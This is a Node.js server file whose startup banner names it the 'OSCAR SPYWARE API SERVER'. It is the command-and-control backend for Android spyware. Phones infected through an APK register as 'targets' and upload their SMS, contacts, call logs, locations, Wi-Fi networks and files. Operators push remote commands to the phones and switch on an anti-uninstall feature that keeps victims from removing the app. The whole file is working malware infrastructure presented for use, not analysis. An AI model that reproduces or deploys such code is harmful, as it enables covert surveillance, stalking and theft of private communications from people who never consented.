const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const cron = require('node-cron');
require('dotenv').config();
const db = require('./database');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, path.join(__dirname, '../uploads/'));
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// ============= AUTH MIDDLEWARE =============
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) return res.status(401).json({ error: 'No token provided' });

    jwt.verify(token, process.env.JWT_SECRET || 'oscar_secret_key_2024', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// ============= REST API ENDPOINTS =============

// Login
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await db.authenticateUser(username, password);
        
        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role, oscar_id: user.oscar_id },
            process.env.JWT_SECRET || 'oscar_secret_key_2024',
            { expiresIn: '7d' }
        );
        
        const session = await db.createSession(user.id, user.oscar_id, req.headers['user-agent'], req.ip);
        
        res.json({
            success: true,
            token,
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role,
                oscar_id: user.oscar_id,
                api_key: user.api_key
            },
            session
        });
    } catch (error) {
        res.status(401).json({ success: false, error: error.toString() });
    }
});

// Get all targets for current user (by OSCAR ID)
app.get('/api/targets', authenticateToken, async (req, res) => {
    try {
        const targets = await db.getAllTargets(req.user.oscar_id);
        res.json({ success: true, targets });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// Get target details
app.get('/api/targets/:device_id', authenticateToken, async (req, res) => {
    try {
        const target = await db.getTarget(req.params.device_id);
        res.json({ success: true, target });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// Get target data by type
app.get('/api/targets/:target_id/data/:type', authenticateToken, async (req, res) => {
    try {
        const { target_id, type } = req.params;
        let data = [];
        
        switch(type) {
            case 'sms':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM sms_messages WHERE target_id = ? ORDER BY timestamp DESC', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
            case 'contacts':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM contacts WHERE target_id = ? ORDER BY name', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
            case 'calls':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM call_logs WHERE target_id = ? ORDER BY timestamp DESC', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
            case 'locations':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM locations WHERE target_id = ? ORDER BY timestamp DESC LIMIT 100', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
            case 'wifi':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM wifi_networks WHERE target_id = ? ORDER BY last_seen DESC', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
            case 'files':
                data = await new Promise((resolve, reject) => {
                    db.db.all('SELECT * FROM files WHERE target_id = ? AND is_deleted = 0 ORDER BY file_name', 
                        [target_id], (err, rows) => err ? reject(err) : resolve(rows));
                });
                break;
        }
        
        res.json({ success: true, data });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// Send command to target
app.post('/api/targets/:device_id/command', authenticateToken, async (req, res) => {
    try {
        const { device_id } = req.params;
        const { command, parameters } = req.body;
        
        const target = await db.getTarget(device_id);
        if (!target) return res.status(404).json({ error: 'Target not found' });
        
        const commandId = await db.addCommand(target.id, req.user.oscar_id, command, parameters);
        
        // Emit via socket if target is online
        io.to(`target_${device_id}`).emit('command', {
            id: commandId,
            command,
            parameters
        });
        
        res.json({ success: true, commandId });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// Anti-uninstall toggle
app.post('/api/targets/:device_id/anti-uninstall', authenticateToken, async (req, res) => {
    try {
        const { device_id } = req.params;
        const { enabled } = req.body;
        
        const target = await db.getTarget(device_id);
        if (!target) return res.status(404).json({ error: 'Target not found' });
        
        await db.logAntiUninstall(target.id, req.user.oscar_id, enabled ? 'ENABLE' : 'DISABLE', true);
        
        io.to(`target_${device_id}`).emit('anti_uninstall', { enabled });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// Get statistics
app.get('/api/statistics', authenticateToken, async (req, res) => {
    try {
        const stats = await db.getStatistics(req.user.oscar_id);
        res.json({ success: true, ...stats });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// ============= SOCKET.IO =============
io.on('connection', (socket) => {
    console.log('🔌 New client connected:', socket.id);
    
    // Target registration from APK
    socket.on('register_target', async (data) => {
        try {
            const {
                oscar_id, device_id, device_name, device_model, android_version,
                ip_address, country, city, sim_slot1, sim_slot2, operator,
                battery_level, all_permissions_granted
            } = data;
            
            // Verify OSCAR ID exists
            const user = await db.getUserByOscarId(oscar_id);
            if (!user) {
                socket.emit('error', 'Invalid OSCAR ID');
                return;
            }
            
            const target = await db.registerTarget({
                oscar_id, device_id, device_name, device_model, android_version,
                ip_address, country, city, sim_slot1, sim_slot2, operator,
                battery_level, all_permissions_granted: all_permissions_granted || 1
            });
            
            socket.join(`target_${device_id}`);
            socket.targetId = target.id;
            socket.deviceId = device_id;
            socket.oscarId = oscar_id;
            
            if (battery_level) {
                await db.updateTargetStatus(device_id, true, battery_level);
            } else {
                await db.updateTargetStatus(device_id, true);
            }
            
            io.emit('target_online', { device_id, device_name, oscar_id });
            
            // Send pending commands
            const pendingCommands = await db.getPendingCommands(target.id);
            pendingCommands.forEach(cmd => {
                socket.emit('command', cmd);
            });
            
            console.log(`✅ Target registered: ${device_name} (${device_id}) for OSCAR ID: ${oscar_id}`);
        } catch (error) {
            console.error('❌ Target registration error:', error);
        }
    });
    
    // Target sends collected data
    socket.on('send_data', async (data) => {
        try {
            const { type, content, timestamp } = data;
            
            if (!socket.targetId || !socket.oscarId) return;
            
            await db.saveCollectedData(socket.targetId, socket.oscarId, type, JSON.stringify(content));
            
            if (type === 'sms') {
                await db.saveSMS(socket.targetId, socket.oscarId, content);
            } else if (type === 'contacts') {
                await db.saveContacts(socket.targetId, socket.oscarId, content);
            } else if (type === 'location') {
                await db.saveLocation(socket.targetId, socket.oscarId, content);
            }
            
            socket.broadcast.emit('new_data', {
                target_id: socket.deviceId,
                oscar_id: socket.oscarId,
                type,
                timestamp
            });
            
            console.log(`📥 Data received from ${socket.deviceId}: ${type}`);
        } catch (error) {
            console.error('❌ Data processing error:', error);
        }
    });
    
    // Command result
    socket.on('command_result', async (data) => {
        try {
            const { command_id, status, result } = data;
            await db.updateCommandStatus(command_id, status, result);
            
            socket.broadcast.emit('command_updated', {
                command_id,
                status,
                result
            });
        } catch (error) {
            console.error('❌ Command result error:', error);
        }
    });
    
    // Anti-uninstall status
    socket.on('anti_uninstall_status', async (data) => {
        try {
            const { enabled } = data;
            if (!socket.targetId || !socket.oscarId) return;
            
            await db.logAntiUninstall(socket.targetId, socket.oscarId, enabled ? 'ENABLED' : 'DISABLED', true);
            
            socket.broadcast.emit('anti_uninstall_update', {
                target_id: socket.deviceId,
                oscar_id: socket.oscarId,
                enabled
            });
        } catch (error) {
            console.error('❌ Anti-uninstall error:', error);
        }
    });
    
    // Battery update
    socket.on('battery_update', async (data) => {
        try {
            const { level } = data;
            if (!socket.deviceId) return;
            
            await db.updateTargetStatus(socket.deviceId, true, level);
            
            socket.broadcast.emit('battery_changed', {
                target_id: socket.deviceId,
                level
            });
        } catch (error) {
            console.error('❌ Battery update error:', error);
        }
    });
    
    // Disconnect
    socket.on('disconnect', async () => {
        if (socket.deviceId) {
            await db.updateTargetStatus(socket.deviceId, false);
            io.emit('target_offline', { device_id: socket.deviceId });
            console.log(`🔴 Target offline: ${socket.deviceId}`);
        }
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ============= SCHEDULED TASKS =============
cron.schedule('0 0 * * *', async () => {
    try {
        await new Promise((resolve, reject) => {
            db.db.run('DELETE FROM sessions WHERE expires_at < CURRENT_TIMESTAMP', (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        console.log('🧹 Cleaned expired sessions');
    } catch (error) {
        console.error('❌ Cleanup error:', error);
    }
});

cron.schedule('*/5 * * * *', async () => {
    try {
        await new Promise((resolve, reject) => {
            db.db.run(`UPDATE targets SET is_online = 0 
                WHERE last_seen < datetime('now', '-10 minutes')`, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
        console.log('⏱️ Offline targets updated');
    } catch (error) {
        console.error('❌ Offline check error:', error);
    }
});

// ============= SERVER START =============
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════╗
    ║    OSCAR SPYWARE API SERVER        ║
    ║    🚀 Running on port ${PORT}         ║
    ║    📡 WebSocket: ws://localhost:${PORT} ║
    ║    📁 Database: SQLite              ║
    ╚════════════════════════════════════╝
    `);
    
    const fs = require('fs');
    if (!fs.existsSync(path.join(__dirname, '../uploads'))) {
        fs.mkdirSync(path.join(__dirname, '../uploads'));
    }
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ Unhandled Rejection:', err);
});
